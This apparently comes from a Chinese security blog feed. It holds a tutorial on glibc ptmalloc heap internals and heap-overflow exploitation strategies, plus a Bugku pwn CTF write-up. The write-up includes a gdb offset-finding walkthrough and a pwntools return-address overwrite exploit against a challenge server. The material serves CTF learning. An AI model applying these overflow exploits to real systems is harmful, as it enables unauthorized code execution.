<p>第一次申请后， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000=0x21000 个字节的堆。这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为 main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>在主线程释放内存后，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>在第一个线程 malloc 之前，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>第一个线程 malloc 后， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为 mmap 函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 thread arena。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>在第一个线程释放内存后， 我们可以从下面的输出看到，这样释放内存同样不会把内存重新给系统。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">After free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<h2 id="heap的相关结构"><a href="#heap的相关结构" class="headerlink" title="heap的相关结构"></a>heap的相关结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。<br>非常有意思的是，无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。<br>malloc_chunk 的结构如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="line">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="line">  fields at known offsets from a given base. See explanation below.</span><br><span class="line">*/</span><br><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>首先，这里给出一些必要的解释 INTERNAL_SIZE_T，SIZE_SZ,MALLOC_ALIGN_MASK：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of</span><br><span class="line">   chunk sizes.</span><br><span class="line">   The default version is the same as size_t.</span><br><span class="line">   While not strictly necessary, it is best to define this as an</span><br><span class="line">   unsigned type, even if size_t is a signed type. This may avoid some</span><br><span class="line">   artificial size limitations on some systems.</span><br><span class="line">   On a 64-bit machine, you may be able to reduce malloc overhead by</span><br><span class="line">   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int&apos; at the</span><br><span class="line">   expense of not being able to handle more than 2^32 of malloced</span><br><span class="line">   space. If this limitation is acceptable, you are encouraged to set</span><br><span class="line">   this unless you are on a platform requiring 16byte alignments. In</span><br><span class="line">   this case the alignment requirements turn out to negate any</span><br><span class="line">   potential advantages of decreasing size_t word size.</span><br><span class="line">   Implementors: Beware of the possible combinations of:</span><br><span class="line">     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,</span><br><span class="line">       and might be the same width as int or as long</span><br><span class="line">     - size_t might have different width and signedness as INTERNAL_SIZE_T</span><br><span class="line">     - int and long might be 32 or 64 bits, and might be the same width</span><br><span class="line">   To deal with this, most comparisons and difference computations</span><br><span class="line">   among INTERNAL_SIZE_Ts should cast them to unsigned long, being</span><br><span class="line">   aware of the fact that casting an unsigned int to a wider long does</span><br><span class="line">   not sign-extend. (This also makes checking for negative numbers</span><br><span class="line">   awkward.) Some of these casts result in harmless compiler warnings</span><br><span class="line">   on some systems.  */</span><br><span class="line">#ifndef INTERNAL_SIZE_T</span><br><span class="line"># define INTERNAL_SIZE_T size_t</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/* The corresponding word size.  */</span><br><span class="line">#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span><br><span class="line"></span><br><span class="line">/* The corresponding bit mask value.  */</span><br><span class="line">#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span><br></pre></td></tr></table></figure>

<p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。<br>每个字段的具体的解释如下:</p>
<ul>
<li>prev_size, 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。<br>size ，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示</li>
<li><ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
</ul>
</li>
<li><ul>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
</ul>
</li>
<li><ul>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
</li>
<li>fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下:</li>
<li><ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
</ul>
</li>
<li><ul>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
</ul>
</li>
<li><ul>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</li>
<li><ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
</ul>
</li>
<li><ul>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
</ul>
</li>
<li><ul>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。<br>一个已经分配的 chunk 的样子如下。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</li>
</ul>
</li>
</ul>
<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。这就是 chunk 中的空间复用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&apos; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&apos; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p>
<ul>
<li><p>本身的 size 字段会记录，</p>
</li>
<li><p>它后面的 chunk 会记录。</p>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p>
</li>
</ul>
<p>不难发现，堆溢出漏洞发生的基本前提是:</p>
<ul>
<li>程序向堆上写入数据。</li>
<li>写入的数据大小没有被良好地控制。<br>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等)。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</li>
<li>覆盖与其物理相邻的下一个 chunk 的内容。</li>
<li><ul>
<li>prev_size</li>
</ul>
</li>
<li><ul>
<li>size，主要有三个比特位，以及该堆块真正的大小。</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>NON_MAIN_ARENA</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>IS_MAPPED</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>PREV_INUSE</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>the True chunk size</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li>chunk content，从而改变程序固有的执行流。</li>
</ul>
</li>
<li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3>堆溢出中比较重要的几个步骤:<h4 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h4>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">//等同于</span><br><span class="line">ptr=malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk,*chunk1;</span><br><span class="line">  chunk=malloc(16);</span><br><span class="line">  chunk1=realloc(chunk,32);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>realloc 的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作:</p>
<ul>
<li>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时</li>
<li><ul>
<li>如果申请 size &gt; 原来 size</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li>如果申请 size &lt; 原来 size</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li>
<li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作<h4 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h4>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</li>
</ul>
<p>常见的危险函数如下</p>
<ul>
<li>输入</li>
<li><ul>
<li>gets，直接读取一行，忽略 ‘\x00’</li>
</ul>
</li>
<li><ul>
<li>scanf</li>
</ul>
</li>
<li><ul>
<li>vscanf</li>
</ul>
</li>
<li>输出</li>
<li><ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串</li>
<li><ul>
<li>strcpy，字符串复制，遇到 ‘\x00’ 停止</li>
</ul>
</li>
<li><ul>
<li>strcat，字符串拼接，遇到 ‘\x00’ 停止</li>
</ul>
</li>
<li><ul>
<li>bcopy<h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4>这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行malloc(0)会返回用户区域为 16 字节的块。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk;</span><br><span class="line">  chunk=malloc(0);</span><br><span class="line">  puts(&quot;Get input:&quot;);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">//根据系统的位数，malloc会分配8或16字节的用户空间</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size = 用户区域大小 + 2 * 字长<br>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 prev_size 字段储存内容。回头再来看下之前的示例代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk;</span><br><span class="line">  chunk=malloc(24);</span><br><span class="line">  puts(&quot;Get input:&quot;);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察如上代码，我们申请的 chunk 大小是 24 个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br></pre></td></tr></table></figure>

<p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 pre_size 域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* pad request bytes into a usable size -- internal version */</span><br><span class="line">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>

<p>当 req=24 时，request2size(24)=32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku pwn</title>
    <url>/2019/12/25/bugku/</url>
    <content><![CDATA[<h1 id="bugku-pwn"><a href="#bugku-pwn" class="headerlink" title="bugku pwn"></a>bugku pwn</h1><a id="more"></a>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><ul>
<li>checksec发现什么保护都没有,拖进ida看看.<br>main函数<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-30h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x30uLL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  puts(&quot;say something?&quot;);</span><br><span class="line">  read(0, &amp;s, 0x100uLL);</span><br><span class="line">  puts(&quot;oh,that&apos;s so boring!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>get_shell_函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int get_shell_()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);</span><br><span class="line">  puts(&quot;this is your flag!&quot;);</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应该是让返回地址覆盖成getshell地址，<br>gdb看一下偏移</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb</span><br><span class="line">file pwn2</span><br><span class="line">break read</span><br><span class="line">start</span><br><span class="line">ni</span><br><span class="line">continue</span><br><span class="line">pattern create 100</span><br><span class="line">step</span><br><span class="line">pattern offset bAA1</span><br><span class="line">print get_shell_</span><br></pre></td></tr></table></figure>

<p>rbp前四位为bAA1，算一下偏移<br>到rbp偏移为48，向上8字节是父函数rbp，所以偏移56覆盖到返回地址，get_shell_地址为<br>exp如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&apos;114.116.54.89&apos;,&apos;10003&apos;)</span><br><span class="line">payload=&apos;a&apos;*48+&apos;a&apos;*8+p64(0x400751)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><ul>
<li>checksec跑一下,并没有什么壳或保护.<br>ida64位打开一下,虽然有一个read函数,可以输入30字节,10字节的缓冲区可以制造溢出.但是没有系统函数可以调用.<br><code>shift+f12</code>查看有没有可疑字符串，然后在字符串上按<code>x</code>查看引用他的地方，找到了一个system函数.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_400751()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;ok~you find me,but you can&apos;t get my shell&apos;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
